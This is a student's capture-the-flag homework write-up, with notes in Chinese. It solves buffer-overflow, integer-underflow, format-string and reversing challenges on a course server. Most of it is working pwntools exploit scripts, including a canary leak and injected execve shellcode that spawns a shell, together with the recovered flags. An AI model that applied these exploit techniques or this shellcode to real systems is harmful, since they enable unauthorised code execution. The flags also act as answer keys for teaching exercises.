# Program Security Hw00

### HelloWorld

```
Just copy past!!

FLAG{Hello CTF}
```

### Pwn1

直接將Return Address蓋掉即可

```python=
#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10120)

payload = '0123456789012345678901234567890100000000'
+ '\x66\x05\x40\x00\x00\x00\x00\x00'

r.sendline(payload)
r.interactive()
```
```
Get Shell!
$ cd /home/pwn1 && cat flag

FLAG{BuFFer_0V3Rflow_is_too_easy}
```


### BubbleSort
在要求輸入需要sort幾個elment的部分發現輸入負數會導致程式進行overflow的sort
因此，我們可利用這個漏洞來達到將return address置換成我們所需要的值。

```python=
#!/usr/bin/env python
#
from pwn import *

payload = '127' + '\n' + '134514048 '
 + '0 ' * 126 + '\n' + '-125\n'

r = remote('csie.ctf.tw', 10121)
r.sendline(payload)
r.interactive()
```
```
Get Shell!!
$ cd /home/BubbleSort && cat flag

FLAG{Bubble_sort_is_too_slow_and_this_question_is_too_easy}
```

### ret222
本題ASLR, NX, Canary, PIE都有
有format string的漏洞 bss section是可寫入的並且在最後exit前會用mprotect讓此區域變成可執行
因此將shellcode寫入到bss區域在利用leak canary的方式去繞過canary並複寫main的return address

```python=
#!/usr/bin/env python

from pwn import *

setName = "1"
getName = "2"
setData = "3"
exit = "4"

base = 0
startMainAddr = 0
offset = long(0x24b60)
# context.log_level = 'DEBUG'


def Wait():
    sleep(0.5)


def Leak(payload, isString = False):
    
    r.sendline(setName)
    Wait()
    r.sendline(payload)
    Wait()
    r.sendline(getName)
    Wait()

    resp = r.recvline_contains('.AAA')[7:-23]
    
    if isString == False:
        return long(resp, 16)
    else:
        return resp



def LeakBase():
    global base

    payload = "%24$p.AAA"

    resp = Leak(payload) 

    base = resp & (~0xfff)
    print "base:", str(hex(base))


def LeakAddr(addr):
    
    print "leaking:", hex(addr)
    
    SetTarget(addr)

    payload = "%7$s.AAA"  
    resp = Leak(payload, True)

    print "Response:", resp

    return resp

def SetTarget(addr):
    
    payload = 'ABCDEFGH' + p64(addr)

    r.sendline(setData)
    Wait()
    r.sendline(payload)
    Wait()
    

def OverWrite(val):
    if ord(val) > 0:
        payload = "%" + str(ord(val)) + "c%7$nAA" 
    else:
        payload = "%7$nAA"
    r.sendline(setName)
    Wait()
    r.sendline(payload)
    Wait()
    r.sendline(getName)
    Wait()
    

def OverWriteOneByte(addr, val):

    SetTarget(addr)

    resp = Leak("%7$p.AAA")
    print "check write to stack:", str(hex(resp))
    # raw_input('#')
    
    OverWrite(val)

    print "Set Target:", str(hex(addr)), "value:", str(hex(ord(val)))

def LeakCanary():
    
    print "Leak Canary: "
    payload = '%23$p.AAA'
    
    resp = Leak(payload)
    print "Response:", str(hex(resp))

    return resp


# r = process('./ret222')
r = remote('csie.ctf.tw', 10122)

LeakBase()
canary = LeakCanary()
log.success('Canary: ' + str(canary))



shellcode = '\x48\xc7\xc0\x3b\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05'

LeakAddr(base+long(0x202030))
for i in range(0,len(shellcode)):
    OverWriteOneByte(base + long(i) + long(0x202030), shellcode[i])

r.sendline(setData)
Wait()
r.sendline('ABCDEFGH' + 'A'*128 + p64(canary) + 'A'*8 + p64(base+long(0x202030)))
Wait()

r.sendline(exit)
Wait()

r.interactive()

```
```
$ cat home/ret222/flag
FLAG{YOU_ARE_REALLY_SMART!!!!!!}
```

### Rev1
```
# Entering gdb console

$ gdb rev1
(gdb) break main
(gdb) r
(gdb) call print_flag()

FLAG{_reverse_is_fun}
```

### Rev2

查詢"Try harder" 在哪邊被使用過
之後找到一連串的xor以及cmp instruction
做Reverse之後得到flag

詳細如下

#### 0x401101
```
loc_401101:             ; uType
push    30h
push    offset Caption  ; lpCaption
push    offset aTryHarder ; "Try harder!"
push    0               ; hWnd
call    ds:MessageBoxA
mov     eax, 1

...

```

![](https://i.imgur.com/O8BPyZW.png)

#### unk_4120BC 
```
    0x8a808d8bb794fcbe93b8a3938fbef8afa79381ffb1 
    
    xor with 0xccccccc...
    
    Get flag FLAG{X0r_to_Cr4ck_M3}
```
    
